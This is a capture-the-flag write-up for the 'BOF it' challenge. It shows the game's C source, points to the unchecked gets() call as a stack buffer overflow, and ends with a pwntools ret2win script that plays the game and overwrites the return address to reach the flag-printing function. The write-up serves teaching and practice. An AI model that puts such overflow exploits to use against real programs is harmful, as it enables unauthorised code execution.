We're working with a x64 binary and sweeeet no protection is enabled.

But sadly no form of shellcode will be done ðŸ˜ž 

Source code is given lets have a look at it

```
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>

void win_game(){
	char buf[100];
	FILE* fptr = fopen("flag.txt", "r");
	fgets(buf, 100, fptr);
	printf("%s", buf);
}

int play_game(){
	char c;
	char input[20];
	int choice;
	bool correct = true;
	int score = 0;
	srand(time(0));
	while(correct){
		choice = rand() % 4;
		switch(choice){
			case 0:
				printf("BOF it!\n");
				c = getchar();
				if(c != 'B') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 1:
				printf("Pull it!\n");
				c = getchar();
				if(c != 'P') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 2:
				printf("Twist it!\n");
				c = getchar();
				if(c != 'T') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 3:
				printf("Shout it!\n");
				gets(input);
				if(strlen(input) < 10) correct = false;
				break;
		}
		score++;
	}
	return score;
}

void welcome(){
	char input;
	printf("Welcome to BOF it! The game featuring 4 hilarious commands to keep players on their toes\n");
	printf("You'll have a second to respond to a series of commands\n");
	printf("BOF it: Reply with a capital \'B\'\n");
	printf("Pull it: Reply with a capital \'P\'\n");
	printf("Twist it: Reply with a capital \'T\'\n");
	printf("Shout it: Reply with a string of at least 10 characters\n");
	printf("BOF it to start!\n");
	input = getchar();
	while(input != 'B'){
		printf("BOF it to start!\n");
		input = getchar();
	}
	while((input = getchar()) != '\n' && input != EOF);
}

int main(){
	int score = 0;
	welcome();
	score = play_game();
	printf("Congrats! Final score: %d\n", score);
	return 0;
}
```

Its pretty much of a game 

Here's what the games does 

```
 The game has four commands that the user must respond to within a second, and they are "BOF it!", "Pull it!", "Twist it!", and "Shout it!".
 The user must respond to each command according to the prompt, either by typing "B" for "BOF it!", "P" for "Pull it!", "T" for "Twist it!", or typing a string of at least 10 characters for "Shout it!".
 The game continues until the user makes a mistake in their response, at which point the final score is displayed, indicating the number of commands that were successfully completed.
 ```
 
 So after all the shakara (pride) the code does here's it vulnerability
 
 ```
 case 3:
				printf("Shout it!\n");
				gets(input);
				if(strlen(input) < 10) correct = false;
				break;
```

Using get is insecure here's why:
 
 ```
 The function "gets()" is used to read the user's input, and it does not check the size of the input before storing it in the "input" buffer, which has a fixed size of 20 characters. This allows a user to write more data to the buffer than it can hold, potentially overwriting adjacent memory, which can lead to unexpected behavior and can be used to compromise the security of the program
 ```
 
So with this we know that this is a ret2win bof challenge as the win_game function is called in the main function

And what the win_game does is to open the content of the flag and print it out

```
void win_game(){
	char buf[100];
	FILE* fptr = fopen("flag.txt", "r");
	fgets(buf, 100, fptr);
	printf("%s", buf);
}
```

Since i know what the code does, here's what i did:

I had to make the exploit script to eventually play the game and keep giving the expected value the programs needs till it reach the case where the vuln function lays

With that i can then make the rip (instruction pointer) call the win_game function

Here's how i got the win_game function `0x0000000000401256`

I used the cyclic method with gdb to determine my offset, then finished the exploit by adding the address of win_game in order to jump there when I deliberately trigger the return condition

Also it should be noted there appear to be no cases in which the function calls exit(), and it will return if you trigger the break on any of the cases by answering incorrectly

With this I used the cyclic method with gdb to determine my offset, then finished the exploit by adding the address of win_game in order to jump there when I deliberately trigger the return condition

Here's the exploit

```
from pwn import *

target = process(b'./bofit')

#pid = gdb.attach(target, "\nb *play_game+368\ncontinue")

print(target.recvuntil(b'BOF it to start!'))

target.sendline(b'B')

while True:
        current = target.recvuntil(b'it!')
        print(current)
        if b'BOF' in current:
                target.sendline(b'B')
        elif b'Pull' in current:
                target.sendline(b'P')
        elif b'Twist' in current:
                target.sendline(b'T')
        else:
                #payload = cyclic(200)
                padding = b'a' * 56
                payload = padding
                payload += p64(0x00401256)
                target.sendline(payload)
                break
print(target.recvuntil(b'it!'))
target.sendline(b'end') #basically i just want the game to end so rip will call win_game xD
target.interactive()
```
